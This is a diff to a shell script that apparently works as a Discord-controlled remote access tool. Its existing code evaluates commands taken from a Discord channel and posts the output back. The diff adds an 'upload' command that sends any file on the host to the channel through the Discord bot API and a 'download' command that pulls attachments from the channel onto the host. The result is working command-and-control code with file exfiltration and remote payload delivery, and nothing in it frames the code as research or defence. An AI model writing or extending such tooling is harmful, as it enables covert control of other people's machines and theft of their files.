@@ -117,6 +117,64 @@ get_windows_info() {
     echo "$windows_info"
 }
 
+send_file_to_discord() {
+    local file_path="$1"
+    local token="$token"
+    local chan="$chan"
+    
+    if [ -z "$file_path" ]; then
+        echo "Error: File path not provided."
+        return 1
+    fi
+    
+    if [ ! -f "$file_path" ]; then
+        echo "Error: File does not exist at $file_path."
+        return 1
+    fi
+    
+    local file_name=$(basename "$file_path")
+
+    curl -X POST \
+         -H "Authorization: Bot $token" \
+         -F "file=@$file_path;filename=$file_name" \
+         "https://discord.com/api/v9/channels/$chan/messages"
+}
+
+download_attachment() {
+
+    recent_message=$(curl -s -H "Authorization: Bot $token" "https://discord.com/api/v9/channels/$chan/messages?limit=1")
+    user_id=$(echo "$recent_message" | grep -o '"author":{"id":"[^"]*' | grep -o '[^"]*$')
+    bot_check=$(echo "$recent_message" | grep -o '"bot":true')
+    if [ -n "$user_id" ] && [ -z "$bot_check" ]; then
+        echo ""
+    else
+        echo ""
+    fi
+    
+    # Extract attachment URL from recent message using pattern matching
+    attachment_url=$(echo "$recent_message" | grep -oE 'https://cdn\.discordapp\.com/attachments/[^"]+')
+    
+    # Check if attachment URL exists
+    if [ -n "$attachment_url" ]; then
+        echo "Received 'download' command with attachment URL: $attachment_url"
+        
+        # Extract the filename from the URL
+        file_name=$(basename "$attachment_url")
+
+        # Download the file using curl
+        curl -O -J -L "$attachment_url"
+        
+        # Check if the download was successful
+        if [ $? -eq 0 ]; then
+            echo "File downloaded successfully: $file_name"
+        else
+            echo "Error downloading file from URL: $attachment_url"
+        fi
+    else
+        echo "No attachment found or invalid command for download."
+    fi
+}
+
 execute_command() {
 
     command_result=$(eval "$1" 2>&1)
@@ -137,7 +195,22 @@ execute_command() {
             curl -X POST -H "Authorization: Bot $token" -H "Content-Type: application/json" -d "$json_payload" "https://discord.com/api/v9/channels/$chan/messages"
             return
         fi
-    
+
+        if [ "$1" == "download" ]; then
+            echo "Received 'Download' command."
+            command="$1"
+            download_attachment
+        fi
+
+        command="$1"
+        command_args="${command#* }"
+        if [[ "$command" == "upload"* && -n "$command_args" ]]; then
+            echo "Received 'upload' command with file path: $command_args"
+            send_file_to_discord "$command_args"  # Call the function to send the file
+            return
+        fi
+
+
         if [ "$1" == "sysinfo" ]; then
             echo "Received 'sysinfo' command. Retrieving system information..."
             case "$(uname -s)" in
